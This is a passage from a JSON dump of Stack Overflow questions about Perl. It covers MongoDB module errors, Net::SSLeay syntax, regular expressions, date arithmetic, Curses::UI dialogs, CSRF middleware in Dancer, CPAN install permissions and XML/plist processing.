cpanm:</p>\n\n<pre><code>$ sudo cpanm MongoDB\nMongoDB is up to date. (0.501.1)\n</code></pre>\n\n<p>I created a simple Perl script called <code>loadRaw.pl</code>:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse MongoDB;\nuse MongoDB::Connection;\nuse MongoDB::OID;\n\nprint \"hello\\n\";\n</code></pre>\n\n<p>When I try to run the script, I get a bunch of errors:</p>\n\n<pre><code>$ perl ./loadRaw.pl\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 271, near \"confess \"cannot set fields after querying\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 273, near \"confess 'not a hash reference'\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 294, near \"confess \"cannot set sort after querying\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 296, near \"confess 'not a hash reference'\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 317, near \"confess \"cannot set limit after querying\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 343, near \"confess \"Cannot set tailable state\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 366, near \"confess \"cannot set skip after querying\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 390, near \"confess \"cannot set snapshot after querying\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 408, near \"confess \"cannot set hint after querying\"\"\n    (Do you need to predeclare confess?)\nString found where operator expected at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 410, near \"confess 'not a hash reference'\"\n    (Do you need to predeclare confess?)\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 90, near \"has started_iterating\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 271, near \"confess \"cannot set fields after querying\"\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 294, near \"confess \"cannot set sort after querying\"\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 317, near \"confess \"cannot set limit after querying\"\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 343, near \"confess \"Cannot set tailable state\"\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 366, near \"confess \"cannot set skip after querying\"\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 390, near \"confess \"cannot set snapshot after querying\"\"\nsyntax error at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 408, near \"confess \"cannot set hint after querying\"\"\nBEGIN not safe after errors--compilation aborted at /usr/local/lib/perl/5.10.1/MongoDB/Cursor.pm line 564.\nCompilation failed in require at /usr/local/lib/perl/5.10.1/MongoDB/Connection.pm line 26.\nBEGIN failed--compilation aborted at /usr/local/lib/perl/5.10.1/MongoDB/Connection.pm line 26.\nCompilation failed in require at /usr/local/lib/perl/5.10.1/MongoDB.pm line 30.\nBEGIN failed--compilation aborted at /usr/local/lib/perl/5.10.1/MongoDB.pm line 30.\nCompilation failed in require at ./loadRaw.pl line 7.\nBEGIN failed--compilation aborted at ./loadRaw.pl line 7.\n</code></pre>\n\n<p>It seems like the MongoDB Perl module (specifically, the <code>Cursor.pm</code> file) has some syntax errors. The first batch of problems (those related to the <code>confess</code> keyword) are solved if I add the line <code>use Carp;</code> to the top of <code>Cursor.pm</code>. However, I don't think I should have to do this, and instead I'm doing something else incorrectly. Also, the second batch of errors (those related to the <code>has</code> keyword) are not solved by including <code>Carp</code>.</p>\n\n<p>Has anyone else experienced this? Any ideas?</p>\n"},{"tags":["perl","unix","diff","patch"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":49,"score":-5,"question_id":13131134,"title":"unix functions in perl: diff and patch","body":"<p>I need to create the unix functions: diff and patch\nin perl scripts.</p>\n\n<p>I am trying to do that for over 2 weeks!</p>\n\n<p>can somebody help me?\nsend me a link to the scripts something?</p>\n\n<p>cant find nothing on google....</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["perl","syntax","openssl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13129350,"title":"Perl Syntax for Net::SSLeay variable assignment within a \"perl -e\" string (which is itself within a script)","body":"<p>The following excerpt is from the https.monitor from the freeware <code>mon</code> monitoring program.</p>\n\n<pre><code>$result = `$perl -e'use Net::SSLeay ; Net::SSLeay::SSLeay_add_ssl_algorithms() ; print join(\"$field_delim\",Net::SSLeay::get_https(\"$site\", \"$port\", \"$path\"))'`;\n</code></pre>\n\n<p>Some of the HTTPS servers being monitored are not compatible with OpenSSL (Net::SSLeay) with autodetect and/or TLS so the Net::SSLeay::ssl_version variable needs to be changed explicitly to v3. </p>\n\n<p>The following works as expected from a command line and explicitly changes ssl_version to 3:</p>\n\n<pre><code>perl -e 'use Net::SSLeay; Net::SSLeay::SSLeay_add_ssl_algorithms() ; $Net::SSLeay::ssl_version = 3 ; print join(\"&lt;&gt;\",Net::SSLeay::get_https(\"server.domain.internal\", \"443\", \"/\"))'\n</code></pre>\n\n<p>I cannot get this to work in the original line in the https.monitor perl file.\nAs written above, perl will advise of the following error:</p>\n\n<p><code>Can't modify constant item in scalar assignment at -e line 1, near \"3 ;\"</code></p>\n\n<p>I have tried all manner of syntax to get this line to compile and for the ssl_version setting to take, but I can't seem to get both to happen at once. Using \"=>\" syntax for the Net::SSLeay::ssl_version variable assignment I can get it to compile but the setting doesn't appear to \"take\". I have used $Net::SSLeay::ssl_version and \"$Net::SSLeay::ssl_version\", curly braces around the variable, etc, but I can't get this to work right.</p>\n\n<p>What should the syntax be for \"Net::SSLeay::ssl_version = 3\" in the \"perl -e\" line within a perl script?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13129941,"title":"Regular Expression Perl","body":"<p>I am learning regular expression in perl, and i would like to have a function similar as bellow: </p>\n\n<pre><code>sub RegEx() \n{\n  my $T = \"0,1,\";\n  my $T2 = \"-0:0-0:1-0:2-0:3-0:4-1:0-1:1-1:2-1:3-\";\n\n  printf (\"T= %s &lt;br&gt;\", $T);\n  printf (\"T2 %s &lt;br&gt;\", $T2);\n\n  my @values = split(',', $T);\n  foreach my $val (@values) {\n         printf (\"We are at item %s in T &lt;br&gt;\", $val);\n         my $temp = $val .\":\" . \"\\(\\\\d\\)\\+\";\n         printf (\"Rexeg %s &lt;br&gt;\",$temp);\n         @result = split(/$temp/, $T2);\n         foreach my $val2 (@result) {\n                printf (\"T2- %s &lt;br&gt;\", $val2);\n         }\n   }\n}\n</code></pre>\n\n<p>and have the value of $T2 parsed to an array based on an index ($T)</p>\n\n<p>but  The following is being displayed</p>\n\n<pre><code>T= 0,1 \nT2 -0:0-0:1-0:2-0:3-0:4-1:0-1:1-1:2-1:3- \nWe are at item 0 in T \nRexeg 0:(\\d)+ \nT2- - \nT2- 0 \nT2- - \nT2- 1 \nT2- - \nT2- 2 \nT2- - \nT2- 3 \nT2- - \nT2- 4 \nT2- -1:0-1:1-1:2-1:3- \nWe are at item 1 in T \nRexeg 1:(\\d)+ \nT2- -0:0-0:1-0:2-0:3-0:4- \nT2- 0 \nT2- - \nT2- 1 \nT2- - \nT2- 2 \nT2- - \nT2- 3 \nT2- - \n</code></pre>\n\n<p>Kindly let me know why i am still seeing  </p>\n\n<ol>\n<li><p>T2- -0:0-0:1-0:2-0:3-0:4- when the regular expression is 1:(\\d)+</p></li>\n<li><p>\"-\" </p></li>\n</ol>\n\n<p>as the output of @results?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":13130119,"title":"How to properly declare hash outside BEGIN block?","body":"<p>Consider this simple program. Can you explain why the output is different after uncommenting the first two lines? What is happening with my hash with <code>use strict</code>? How to fix the program to work with <code>use strict</code>?</p>\n\n<pre><code>echo -e \"key1\\nkey2\\nkey3\" | perl -lne '\n  #use strict; use warnings;\n  #my %hash;\n  BEGIN { \n    $hash{'key3'} = \"value\";\n  }   \n  chomp;\n  if ($hash{$_}) {\n    print \"$_ matched\";\n  } else {\n    print \"$_ unmatched \";\n  }\n'\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>key1 unmatched \nkey2 unmatched \nkey3 matched\n</code></pre>\n"},{"tags":["perl","operators","subroutine"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":13129450,"title":"Is there a Perl subroutine for exist and defined?","body":"<p>I use exists and defined in if statements all the time</p>\n\n<pre><code>if (exists($a-&gt;{b}) and defined($a-&gt;{b})\n</code></pre>\n\n<p>is there a subroutine that does both of these at the same time?</p>\n\n<p><strong>UPDATE:</strong><br>\nSeems I didn't give very good example code. For a better question and matching answer check out <a href=\"http://stackoverflow.com/questions/9789333/checking-for-existence-of-hash-key-creates-key\">checking-for-existence-of-hash-key-creates-key</a>.</p>\n"},{"tags":["regex","perl"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2355,"score":3,"question_id":5617314,"title":"Perl Regex - Print the matched value","body":"<p>What is the perl regex to print the matched value? For eg I want to print <code>195</code> from this string </p>\n\n<pre><code>\"2011-04-11 00:39:28,736::[main]::INFO (Main.java:73) Test.Main::main() Total Successful Transactions = 195\".\n</code></pre>\n\n<p>How can I do that? Thanks in advance</p>\n"},{"tags":["perl","catalyst","perlbrew"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":13128116,"title":"I am not sure on how I use Perlbrew with Catalyst","body":"<p>I am trying to use Perlbrew with Catalyst in a brand new server. Perlbrew is already installed and working with the last Perl. The advantages are promising, but I am not sure about my working method.</p>\n\n<p><strong>When developing</strong>, I usually start a shell whith the user I use for developing, and I start the Catalyst server with the debugger (script/myapp_server.pl).</p>\n\n<p>So, if I use Perlbrew, I must init Perbrew, switch to the required version of Perl, and then run the Catalyst server.</p>\n\n<p>If I close the shell, next time I connect using my developing user, I must switch Perl again to the right version. Everytime, by my error-prone human hand, isn't it?</p>\n\n<p>The production enviroment is in the same machine.</p>\n\n<p>So, <strong>in the production enviroment</strong>, that I use in a shell connected as Root, before I start the Catalyst socket, I must be sure that the right Perl is activated, also by human action.</p>\n\n<p><strong>And all the modules</strong> that I add to Perl, must be added to the Perlbrew Perl version used by Root AND to the Perlbrew Perl version used by the developer user.</p>\n\n<p>And the last thing, if I try a new Perbrew Perl version... I think that I must add again all modules to the brand new Perl, in both production and developing enviroments...</p>\n\n<p>Is this the correct way????, or I am doing something really weird, making things overcomplicated instead of using Perlbrew to simplify my life?</p>\n\n<p>Regards:\nMiguel</p>\n"},{"tags":["perl","copy","append"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13127586,"title":"copy text after a specific string from a file and append to another in perl","body":"<p>I want to extract the desired information from a file and append it into another. the first file consists of some lines as the header without a specific pattern and just ends with the \"END OF HEADER\" string. I wrote the following code for find the matching line for end of the header:</p>\n\n<pre><code>$find = \"END OF HEADER\";                     \nopen FILEHANDLE, $filename_path;      \nwhile (&lt;FILEHANDLE&gt;) {\n\n     my $line = $_;                                                \n     if ($line =~ /$find/) {\n\n         #??? what shall I do here???                                                                                      \n     }\n}\n</code></pre>\n\n<p>, but I don't know how can I get the rest of the file and append it to the other file.</p>\n\n<p>Thank you for any help</p>\n"},{"tags":["perl","date"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":124,"score":3,"question_id":13122197,"title":"Perl script - add days to Date to get new date","body":"<p>I am working on a perl script to add days to a date and display the newdate:</p>\n\n<pre><code>use Time::ParseDate;\nuse Time::CTime;\n\nmy $date = \"02/01/2003\";\nmy $numdays = 30;\n\nmy $time = parsedate($date);\n\n# add $numdays worth of seconds\nmy $newtime = $time + ($numdays * 24 * 60 * 60);\n\nmy $newdate = strftime(\"%m/%d/%Y\",localtime($newtime));\n\nprint \"$newdate\\n\";\n\n    The output will be:\n\n    03/03/2003\n</code></pre>\n\n<p>Now how do I set the input for the date field to be yyyymmdd Ex: my $date = \"20030102\"</p>\n\n<p>Also the output will need to be : 20030303</p>\n\n<p>Thanks </p>\n"},{"tags":["perl","package"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":49,"score":-4,"question_id":13127130,"title":"How to determine the package for a specific perl module?","body":"<p>Is there a way to determine the package for a specific perl module?\nI'm currently looking for XML::Code...\nAnd, to narrow down the possible answers: I don't want to use cpan.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":397,"score":3,"question_id":4489269,"title":"In perl, what is the difference between $DB::single = 1 and 2?","body":"<p>What is the difference between putting <code>$DB::single=1</code> and <code>$DB::single=2</code> in your code? Both seem to have the identical effect of halting execution at the statement following the assignment when I do a 'c' on the perl debugger command line.</p>\n\n<p><a href=\"http://perldoc.perl.org/perldebug.html\" rel=\"nofollow\"><code>perldebug</code></a> says that a value of 1 is equivalent to having just pressed 's' to get to the next statement, and 2 is the same as 'n', but what difference does it make how you got to the statement?</p>\n"},{"tags":["perl","string","file-io","file"],"answer_count":15,"favorite_count":12,"up_vote_count":17,"down_vote_count":0,"view_count":3958,"score":17,"question_id":206661,"title":"What is the best way to slurp a file into a string in Perl?","body":"<p>Yes, <a href=\"http://en.wikipedia.org/wiki/There_is_more_than_one_way_to_do_it\" rel=\"nofollow\">There's More Than One Way To Do It</a> but there must be a canonical or most efficient or most concise way. I'll add answers I know of and see what percolates to the top.</p>\n\n<p>To be clear, the question is how best to read the contents of a file into a string.\nOne solution per answer.</p>\n"},{"tags":["perl","module"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13126358,"title":"Can I call a .pl file from a module in perl?","body":"<p>I have created a Perl module from a <code>.pl</code> file and I am testing it at the moment. It works until the point where it needs to use another <code>.pl</code> file (to pull out some sql statements). I am calling the file using <code>require 'file.pl';</code>. This is a temporary solution as the <code>.pl</code> file will be replaced in the future by a better database solution, but for now I need to test my module code. It doesn't like trying to find the file, though, even though I have put the path name in <code>@INC</code> using <code>use lib '/path/to/file'</code>. </p>\n\n<p>Is there any temporary solution I can use to solve this problem? I don't know when the <code>.pl</code> file will be replaced, so I can't rely on waiting for that. Should I just move the sql statements into the <code>.pm</code> file even though I will have to remove them later, or do I have to search out the folder that the module is in the put a copy of the <code>.pl</code> file in it?</p>\n"},{"tags":["perl","ncurses","curses"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":402,"score":3,"question_id":7769657,"title":"Curses::UI::Dialog does not respond to enter key","body":"<p>I am trying to create a Curses::UI application. So far everything is working but my dialog does not seem want to respond to the enter key for closing. I have tried the samples and they work but for some reason if I do it this way, the Dialog does not respond to key presses. See, the content in the main window will end up filling the screen and refreshing every x seconds so I'd like the Dialog to overlay the screen and close upon enter. Here is the code from my test script.</p>\n\n<p>If you run it the screen will update every 10 seconds, displaying the time down the left side. After an update, hit X to bring up a dummy dialog. On next update the screen data will cover the dialog box which is still active. Hit enter to get out of the dialog and then you can exit. </p>\n\n<p>My goal is to keep this dialog on top of everything.</p>\n\n<pre><code>#!/usr/local/bin/perl\n\nuse strict;\nuse warnings;\nuse Curses::UI;\n\nmy ($dialog, $main, $ui, $container, $content);\nmy $last_update = 0;\nmy $first_run = 0;\n$ui = Curses::UI-&gt;new(\n    -color_support  =&gt;  1,\n    -mouse_support  =&gt;  0,\n    -border         =&gt;  1,\n    -debug          =&gt;  0\n);\n\n$main = $ui-&gt;add(\n    \"main\", \"Window\",\n    -bfg        =&gt;  \"black\",\n    -x      =&gt;  0,\n    -y      =&gt;  0,\n    -height     =&gt;  $ui-&gt;height,\n    -width      =&gt;  $ui-&gt;width\n);\n\n$main-&gt;focus();\n\n$ui-&gt;set_binding( sub { $ui-&gt;leave_curses; exit(0); }, \"q\");\n$ui-&gt;set_binding( \\&amp;exit, \"x\");\n$ui-&gt;add_callback(\"callback\", \\&amp;callback );\n$ui-&gt;{-read_timeout} = 0.1;\n$ui-&gt;mainloop;\n\nsub callback {\n    if($first_run == 0) {\n        update_body();\n        $first_run = 1;\n    }\n\n    my $now = time;\n    if($now - $last_update &gt;= 10) {\n        update_body();\n        $last_update = time;\n    }\n}\n\nsub update_body {\n    for(my $x = 0; $x &lt; 2000; $x++) {\n        $main-&gt;delete(\"body$x\");\n    }\n\n    for(my $x = 0; $x &lt; ($ui-&gt;height - 5); $x++) {\n        my $now = time;\n        $main-&gt;add(\n            \"body$x\",       \"Label\",\n            -x      =&gt;  0,\n            -y      =&gt;  $x,\n            -text       =&gt;  $now,\n            -width      =&gt;  $ui-&gt;width\n        )-&gt;draw();\n    }\n}\n\nsub exit {\n    my $return = $ui-&gt;dialog(\n        -message   =&gt; \"Test dialog\",\n        -title     =&gt; \"Test\",\n        -buttons   =&gt; ['ok'],\n    );\n}\n</code></pre>\n"},{"tags":["regex","perl","replace"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13122034,"title":"perl replace block of text","body":"<p>I'm very stuck on creating a piece of perl i need.</p>\n\n<p>I have a file which contains the following</p>\n\n<pre><code>    define(`CONFM4_AST_MODULES', `NOLOAD =&gt; app_thingie.so\n    NOLOAD =&gt; app_thingie2.so\n    NOLOAD =&gt; app_thingie3.so')\n</code></pre>\n\n<p>Now i need to be able to rewrite this whole block so i was thinking on matching everything that is between  \"(`CONFM4_AST_MODULES\" and \"')\" Delete it and then append it again. on the end of the file. \nIs it possible to regex a thing like this? if so how?</p>\n\n<p>It is not possible to hardcode the entire text in my perl script as it changes sometimes.</p>\n\n<p>If you have any other ideas on how to solve this i love to hear it :) </p>\n\n<p>also the number of thingies that exist in the file changes from 3 to 20.</p>\n"},{"tags":["javascript","perl","ssl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13122275,"title":"validate format of ssl certificate/key","body":"<p>I have a web form of simple control panel where users can enter their ssl certificate to use  on new virtual host, is there a way to check that certificate at least in correct format and key is valid for certificate, before adding it to webserver config. </p>\n\n<p>I have to use perl or javascript.</p>\n\n<p>Looking for right direction to solve this.</p>\n"},{"tags":["perl","substitution","empty-string"],"answer_count":1,"favorite_count":0,"up_vote_count":13,"down_vote_count":0,"view_count":131,"score":13,"question_id":13119241,"title":"Substitution with empty string: unexpected result","body":"<p>Why are the two printed numbers different?</p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse 5.10.1;\n\nmy $sep = '';\nmy $number = 110110110110111;\n\n$number =~ s/(\\d)(?=(?:\\d{3})+\\b)/$1$sep/g;\nsay \"A: &lt;$number&gt;\";\n\n$number =~ s/\\Q$sep\\E//g;\nsay \"B: &lt;$number&gt;\";\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>A: &lt;110110110110111&gt;\nB: &lt;11111111111&gt;\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":955,"score":0,"question_id":3452880,"title":"Perl RegEx for Matching 11 column File","body":"<p>I'm trying to write a perl regex to match the 5th column of files that contain 11 columns. There's also a preamble and footer which are not data. Any good thoughts on how to do this? Here's what I have so far:</p>\n\n<pre><code>if($line =~ m/\\A.*\\s(\\b\\w{9}\\b)\\s+(\\b[\\d,.]+\\b)\\s+(\\b[\\d,.sh]+\\b)\\s+.*/i) {\n</code></pre>\n\n<p>And this is what the forms look like:</p>\n\n<pre>\n\n    No. Form 13F File Number    Name\n\n    ____    28-________________ None\n\n    [Repeat as necessary.]\n\n                          \nFORM 13F INFORMATION TABLE\n\n                     TITLE OF             VALUE    SHRS OR  SH /PUT/  INVESTMENT   OTHER    VOTING AUTHORITY\n   NAME OF INSURER     CLASS   CUSSIP    (X$1000)   PRN AMT  PRNCALL  DISCRETION  MANAGERS    SOLE    SHARED   NONE\nAbbott Laboratories com 2824100 4,570   97,705  SH  sole    97,705  0   0\nAllstate Corp   com 20002101    12,882  448,398 SH  sole    448,398 0   0\nAmerican Express Co com 25816109    11,669  293,909 SH  sole    293,909 0   0\nApollo Group Inc    com 37604105    8,286   195,106 SH  sole    195,106 0   0\nBank of America com 60505104    174 12,100  SH  sole    12,100  0   0\nBaxter Internat'l Inc   com 71813109    2,122   52,210  SH  sole    52,210  0   0\nBecton Dickinson & Co   com 75887109    8,216   121,506 SH  sole    121,506 0   0\nCitigroup Inc   com 172967101   13,514  3,594,141   SH  sole    3,594,141   0   0\nCoca-Cola Co.   com 191216100   318 6,345   SH  sole    6,345   0   0\nColgate Palmolive Co    com 194162103   523 6,644   SH  sole    6,644   0   0\n\n</pre>\n"},{"tags":["perl","csrf","dancer","plack"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13108894,"title":"How to use Plack::Middleware::CSRFBlock with Dancer?","body":"<p>I want to protect all forms from CSRF with <code>Dancer</code>.</p>\n\n<p>I tried using <code>Plack::Middleware::CSRFBlock</code>, but the error said \"CSRFBlock needs Session.\". Even if I use <code>Plack::Session</code>, forms didn't have a hidden input field that contains one time token.</p>\n\n<p>Are there any good practice to do this? Any advice much appreciated.</p>\n\n<p>my <code>environment/development.yml</code> is:</p>\n\n<pre><code># configuration file for development environment\n\n# the logger engine to use\n# console: log messages to STDOUT (your console where you started the\n#          application server)\n# file:    log message to a file in log/\nlogger: \"console\"\n\n# the log level for this environment\n# core is the lowest, it shows Dancer's core log messages as well as yours\n# (debug, info, warning and error)\nlog: \"core\"\n\n# should Dancer consider warnings as critical errors?\nwarnings: 1\n\n# should Dancer show a stacktrace when an error is caught?\nshow_errors: 1\n\n# auto_reload is a development and experimental feature\n# you should enable it by yourself if you want it\n# Module::Refresh is needed \n# \n# Be aware it's unstable and may cause a memory leak.\n# DO NOT EVER USE THIS FEATURE IN PRODUCTION \n# OR TINY KITTENS SHALL DIE WITH LOTS OF SUFFERING\nauto_reload: 0\n\nsession: Simple\n#session: YAML\n\nplack_middlewares:\n    -\n        #- Session\n        - CSRFBlock\n        - Debug\n        - panels\n        -\n            - Parameters\n            - Dancer::Version\n            - Dancer::Settings\n            - Memory\n</code></pre>\n\n<p>and the route is:</p>\n\n<pre><code>get '/test' =&gt; sub {\n    return &lt;&lt;EOM\n        &lt;!DOCTYPE html&gt;\n        &lt;html&gt;\n        &lt;head&gt;&lt;title&gt;test route&lt;/title&gt;&lt;/head&gt;\n        &lt;body&gt;\n            &lt;form action=\"./foobar\" method=\"post\"&gt;\n            &lt;input type=\"text\"/&gt;\n            &lt;input type=\"submit\"/&gt;\n            &lt;/form&gt;\n        &lt;/body&gt;\n        &lt;/html&gt;\nEOM\n};\n</code></pre>\n"},{"tags":["perl","cpan","parseexcel"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":50,"score":0,"question_id":13115345,"title":"Need help installing Spreadsheet::ParseExcel","body":"<p>I am trying to install Spreadsheet::ParseExcel to use with ExcelLatex. This is what I did:\nInstalled Active perl, Then install CPAN.pm by <code>perl -MCPAN -e shell</code> \nI was asked for configuration and mirror site and I let perl do the auoconfoguration. At the end I got the following message: <code>Autoconfiguration complete.</code>Then I tried:\n<code>perl -MCPAN -e 'install \"Spreadsheet::WriteExcel\"'</code>\nAnd it tried to install it but at the end I got the following error:</p>\n\n<pre><code>ERROR: Can't create '/Library/Perl/5.12/Spreadsheet'\nmkdir /Library/Perl/5.12/Spreadsheet: Permission denied at     /System/Library/Perl/5.12/ExtUtils/Install.pm line 494\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n at -e line 1\nmake: *** [pure_site_install] Error 13\n  JMCNAMARA/Spreadsheet-WriteExcel-2.37.tar.gz\n  /usr/bin/make install  -- NOT OK\n</code></pre>\n\n<p>I really appreciate it one please help me how I can solve the problem</p>\n"},{"tags":["perl"],"answer_count":7,"favorite_count":0,"up_vote_count":9,"down_vote_count":2,"view_count":6987,"score":7,"question_id":3910858,"title":"Using Perl, how do I compare dates in the form of YYYY-MM-DD?","body":"<p>I have an array with <code>n</code> strings in format of YYYY-MM-DD (Example, \"2010-10-31\"). </p>\n\n<p>How do I compare a date to the strings in this array? </p>\n\n<p>For example, delete the strings more than 30 day ago?</p>\n"},{"tags":["c#","perl","unicode","collation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13117025,"title":"Perl Unicode string collation interop with C# String.Compare","body":"<p>Using Perl 5.14, I'm creating two index files to be used by a C# Windows Phone 7.5 application. The keys in the \"English\" index are mostly ASCII but occasionally contain Unicode (UTF-8) characters. The keys in the \"Chinese\" index are all UTF-8 (Simplified Chinese). I am sorting the keys of the indices so I can do a fast lookup (binary search) in the Windows Phone app.</p>\n\n<p>My starting point was to use Perl's built-in sort() function and C#'s default String.Compare. For the most part this Just Worksâ¢. With the Chinese characters, I had some trouble where the C# System.Threading.Thread.CurrentThread.CurrentCulture could vary depending on the user-specified locale (for example, on a \"zh-CN\" device set up for a Chinese user), but I got past that by locking the CurrentCulture to \"en-GB\" (same as my build machine) for the duration of the search.</p>\n\n<p>So for a while it seemed that Perl's sort() and C#'s String.Compare() would play nicely together.</p>\n\n<p>However, recently my data source was updated so I rebuilt the indexes. Now in some cases the lookup against the English index fails (Chinese still works). I debugged it and I can see that when the binary search lands on a key containing a high-value Unicode character, it can sometimes (not always) go off in the wrong direction and fail to find a match.</p>\n\n<p>I guess there are more subtle Unicode collation variables at play here, so before I go further, does anyone have the <em>magic formula</em> for how to reliably sort Unicode data from Perl for use in C#?</p>\n"},{"tags":["regex","arrays","perl","comparison","match"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":846,"score":3,"question_id":8216848,"title":"Perl, comparing scalar to array (with regex?)","body":"<p>I'll be brief so I don't waste your time;</p>\n\n<p>Simple problem, i have an array of say, hundreds of dogs</p>\n\n<pre><code>my @dogs = qw(Shepard Lab Dalmation Husky Chow Pitbull ...)\n</code></pre>\n\n<p>and i want to compare it to a single dog</p>\n\n<pre><code>my $doggy = \"Shepard\";\n</code></pre>\n\n<p>pretty stupid i know, but how would i do that?</p>\n\n<pre><code># Regex match against array?\n# (This doesnt even work but its how i would think of doing it)\nif ($doggy =~ /@dogs/) {\nprint $doggy;\n}\n</code></pre>\n\n<p>Thanks for any answers in advance, I appreciate you guys helping me with what is probably a really stupid question. Thank you</p>\n"},{"tags":["xml","perl","xml-parsing","extract"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":70,"score":0,"question_id":13085781,"title":"Extracting only the values of xml removing the xml tag","body":"<p>I have a xml file for example,</p>\n\n<pre><code>&lt;title&gt; hello &lt;name&gt; hi &lt;/name&gt; &lt;street&gt; id &lt;/street&gt; this is xml file &lt;/title&gt;\n</code></pre>\n\n<p>Here the parent node is <code>title</code>. I am going to extract the text inside the parent node removing the inner tags. </p>\n\n<p>I have tried with the regex. But Is there any way other than using regex like, using some xml based functions to remove the tags. Note: the tag name is not known beforehand.</p>\n\n<p>Hi I have tried this, I used the same xml </p>\n\n<pre><code>use XML::Simple; \nuse Data::Dumper; \n\nmy $simple = XML::Simple-&gt;new(); \nmy $data = $simple-&gt;XMLin('XMLRemoval.xml'); \nmy %oldHash = %$data; my %newHash = (); \n\nwhile ( my ($key, $innerRef) = each %oldHash ) \n{ \n    $newHash{$key} = @$innerRef[1]; \n} \n\nforeach $key ( keys %newHash ) \n{ \n    print $newHash{$key}; \n}\n</code></pre>\n\n<p>And I am getting the error : Can't use string (\" id \") as an ARRAY ref while \"strict refs\"</p>\n"},{"tags":["perl","xslt","libxslt"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":13115952,"title":"Could not open file perl","body":"<p>I am trying to convert a plist files into a JUnit style XMLs. I have a xsl stylesheet which converts the plist to JUnit/ANT XML. </p>\n\n<p>Here is the perl code which I run to convert the plist to XML:</p>\n\n<pre><code>my $parser = XML::LibXML-&gt;new();\nmy $xslt = XML::LibXSLT-&gt;new();\nmy $stylesheet = $xslt-&gt;parse_stylesheet_file(\"\\\\\\~/Hudson/build/workspace/ui-automation/automation\\\\\\ test\\\\\\ suite/plist2junit.xsl\");\n\nmy $counter = 1;\nmy @plistFiles = glob('Logs/*/*.plist');\nforeach (@plistFiles){\n    #Escape the file path and specify abosulte path\n    my $plistFile = $_;\n    $plistFile =~ s/([ ()])/\\\\$1/g;\n    $path2plist = \"\\\\\\~/Hudson/build/workspace/ui-automation/automation\\\\\\ test\\\\\\ suite/$plistFile\";\n    #transform the plist file to xml\n    my $source = $parser-&gt;parse_file($path2plist);\n    my $results = $stylesheet-&gt;transform($source);\n\n    my $resultsFile = \"\\\\\\~/Hudson/build/workspace/ui-automation/automation\\\\\\ test\\\\\\ 